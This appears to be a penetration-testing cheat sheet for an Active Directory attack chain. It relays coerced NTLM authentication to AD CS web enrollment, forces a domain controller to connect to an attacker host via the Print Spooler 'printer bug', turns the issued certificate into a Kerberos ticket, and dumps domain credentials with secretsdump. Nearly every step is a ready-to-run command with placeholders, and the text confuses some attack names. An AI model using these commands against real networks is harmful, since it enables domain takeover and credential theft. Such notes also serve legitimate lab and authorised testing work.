
## 1. Listen for Inbound Connections (NTLM authentication packets)

- Listening for NTLM authentication packets in the SMB server. If those hashes are found we can relay them to the `web enrollment` site and perform **Pass the Ticket** attack.

```bash
impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

## 2. Force Victim Machine to Connect to Attacker Machine (Coercion)

- Attackers can either wait for the victim machine to attempt authentication or they can force the victim machines to attempt authentication by exploiting the **printer bug**. This requires the victim machine to have `Printer Spooler` service running.

- **HOW THE PRINTER SPOOFER ATTACK WORKS** :
	1. **The Request:** An attacker with low-privileged, ordinary domain user credentials sends a specific remote procedure call (RPC) request (`RpcRemoteFindFirstPrinterChangeNotificationEx`) to a target server running the Windows Print Spooler service. 
	2. **The Trick:** This request forces the target server to check for "printer updates" by reaching out to an external path.
	3. **The Forced Handshake:** The target server automatically attempts to connect back to the attacker-controlled machine, transmitting its own high-level computer account credentials (via NTLM or Kerberos) in the process.
	4. **CONNECTION** : now print spoofer used to force dc to send its ntlm hash and impacket listener is used to receive the ntlm hash packet.


```bash
python3 printerbug.py <DOMAIN_NAME>/<DOMAIN_USER/CONTROLLER>:"<DOMAIN_USER/CONTROLLER_PASSWORD>"@<DOMAIN_IP> <ATTACKER_IP>
```

- If the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for that domain user or domain controller, then we can perform our **Pass the Certificate** attack to obtain the **TGT** as that domain user or domain controller. 
- You will obtain the `CERTIFICATE` here if authentication works successfully.

## 3. Obtain Kerberos Ticket

- Using the issued Certificate we can obtain the Kerberos ticket for that domain user or domain controller.
- `CERTIFICATE_FILEPATH` : mention the path of the certificate you got during listening for NTLM authentications.
- `KERBEROS_TICKET_FILENAME` : is the filename and path where you want to save the **Kerberos ticket** locally in your attack machine locally.

```bash
python3 gettgtpkinit.py -cert-pfx <CERTIFICATE_FILEPATH> -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN_NAME>' <KERBEROS_TICKET_FILENAME>
```

## 4. Pass the Ticket (PtT)

```bash
export KRB5CCNAME=<KERBEROS_TICKET_FILENAME>
impacket-secretsdump -k -no-pass -dc-ip <DOMAIN_CONTROLLER_IP> -just-dc-user <DOMAIN_USER> '<DOMAIN_CONTROLLER_ACCOUNTNAME>'<DOMAIN_NAME>
```



